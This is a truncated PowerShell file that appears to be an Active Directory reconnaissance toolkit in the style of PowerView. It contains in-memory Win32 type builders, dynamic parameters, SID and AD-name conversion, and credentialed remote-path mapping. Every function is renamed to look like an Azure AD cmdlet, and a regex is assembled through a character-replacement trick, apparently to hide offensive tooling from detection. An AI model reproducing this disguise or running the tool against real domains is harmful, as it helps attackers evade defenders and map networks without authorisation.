function set-azureadmsadministrativeunit {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $modulename = [Guid]::NewGuid().ToString()
    )
    $appdomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $loadedassemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $dynassembly = New-Object Reflection.AssemblyName($ModuleName)
    $domain = $AppDomain
    $assemblybuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $modulebuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function set-azureadmsconditionalaccesspolicy {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $dllname,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $functionname,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $returntype,
        [Parameter(Position = 3)]
        [Type[]]
        $parametertypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $nativecallingconvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $charset,
        [String]
        $entrypoint,
        [Switch]
        $setlasterror
    )
    $properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    New-Object PSObject -Property $Properties
}
function get-azureaddevice
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $dllname,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $functionname,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $entrypoint,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $returntype,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $parametertypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $nativecallingconvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $setlasterror,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $module,
        [ValidateNotNull()]
        [String]
        $namespace = ''
    )
    BEGIN
    {
        $typehash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $dllimport = [Runtime.InteropServices.DllImportAttribute]
            $setlasterrorfield = $DllImport.GetField('SetLastError')
            $callingconventionfield = $DllImport.GetField('CallingConvention')
            $charsetfield = $DllImport.GetField('CharSet')
            $entrypointfield = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $slevalue = $True } else { $slevalue = $False }
            if ($PSBoundParameters['EntryPoint']) { $exportedfuncname = $EntryPoint } else { $exportedfuncname = $FunctionName }
            
            $constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $dllimportattribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $returntypes = @{}
        foreach ($Key in $TypeHash.Keys)
        {
            $type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function get-azureadtenantdetail {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fullname,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $enumelements,
        [Switch]
        $bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $enumtype = $Type -as [Type]
    $enumbuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    if ($Bitfield)
    {
        $flagsconstructor = [FlagsAttribute].GetConstructor(@())
        $flagscustomattribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    foreach ($Key in $EnumElements.Keys)
    {
        
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function get-azureadobjectbyobjectid {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $position,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $type,
        [Parameter(Position = 2)]
        [UInt16]
        $offset,
        [Object[]]
        $marshalas
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function remove-azureadcontactmanager
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fullname,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $structfields,
        [Reflection.Emit.PackingSize]
        $packingsize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $explicitlayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $structattributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($ExplicitLayout)
    {
        $structattributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $structattributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $structbuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $constructorinfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $sizeconst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $fields = New-Object Hashtable[]($StructFields.Count)
    
    
    
    foreach ($Field in $StructFields.Keys)
    {
        $index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    foreach ($Field in $Fields)
    {
        $fieldname = $Field['FieldName']
        $fieldprop = $Field['Properties']
        $offset = $FieldProp['Offset']
        $type = $FieldProp['Type']
        $marshalas = $FieldProp['MarshalAs']
        $newfield = $StructBuilder.DefineField($FieldName, $Type, 'Public')
        if ($MarshalAs)
        {
            $unmanagedtype = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $size = $MarshalAs[1]
                $attribbuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $attribbuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    
    
    $sizemethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ilgenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    
    
    $implicitconverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ilgenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
Function new-azureadtrustedcertificateauthority {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$position,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$helpmessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$dontshow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$valuefrompipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$valuefrompipelinebypropertyname,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$valuefromremainingarguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$parametersetname = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$allownull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$allowemptystring,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$allowemptycollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$validatenotnull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$validatenotnullorempty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$validatecount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$validaterange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$validatelength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$validatepattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$validatescript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$validateset,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$createvariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $boundparameters
    )
    Begin {
        $internaldictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function remove-azureadmsroleassignment { [CmdletBinding()] Param() }
        $commonparameters = (Get-Command remove-azureadmsroleassignment).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            $boundkeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $stalekeys = @()
            $stalekeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            
            $unboundparameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $defaultvalue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$parameter = $DefaultValue
                }
            }
            if($Dictionary) {
                $dpdictionary = $Dictionary
            }
            else {
                $dpdictionary = $InternalDictionary
            }
            
            $getvar = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            
            $attributeregex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $validationregex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $aliasregex = '^Alias$'
            $parameterattribute = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $attributecollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $parameteroptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $parameteralias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}
function get-azureadmsroleassignment {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $outputobject
    )
    BEGIN {
        $mappedcomputers = @{}
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $hostcomputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    get-azureaduserextension -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }
            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $iniobject = New-Object PSObject
                }
                else {
                    $iniobject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" 
                    {
                        $section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $section = $Section.Replace(' ', '')
                            $sectionobject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $commentcount = 0
                    }
                    "^(;.*)$" 
                    {
                        $value = $matches[1].Trim()
                        $commentcount = $CommentCount + 1
                        $name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\a*=(.*)".replace('a', 's') 
                    {
                        $Name, $value = $matches[1..2]
                        $name = $Name.Trim()
                        $values = $Value.split(',') | ForEach-Object { $_.Trim() }
                        
                        if ($PSBoundParameters['OutputObject']) {
                            $name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }
    END {
        
        $MappedComputers.Keys | get-azureaddirectoryroletemplate
    }
}
function remove-azureadmsgroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $objectname,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $domainsearcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }
    PROCESS {
        ForEach ($Object in $ObjectName) {
            $object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $dn = set-azureadapplicationproxyapplicationconnectorgroup -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $userdomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $username = $DN.Split(',')[0].split('=')[1]
                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $domain = $Object.Split('\')[0]
                        $object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $domainsearcherarguments = @{}
                        $domain = (select-azureadgroupidsuserismemberof @DomainSearcherArguments).Name
                    }
                    $obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}
function get-azureaduserregistereddevice {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $objectsid,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $adnamearguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }
    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $targetsid = $TargetSid.trim('*')
            try {
                
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        set-azureadapplicationproxyapplicationconnectorgroup -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}
function set-azureadapplicationproxyapplicationconnectorgroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $outputtype,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $nametypes = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        
        function get-gsgroupmemberlist([__ComObject] $Object, [String] $Method, $Parameters) {
            $output = $Null
            $output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }
        function get-gsuserlicenselist([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }
        function get-azureadapplicationproxyapplication([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }
        
        if ($PSBoundParameters['Server']) {
            $adsinittype = 2
            $initname = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $adsinittype = 1
            $initname = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $cred = $Credential.GetNetworkCredential()
            $adsinittype = 1
            $initname = $Cred.Domain
        }
        else {
            
            $adsinittype = 3
            $initname = $Null
        }
    }
    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
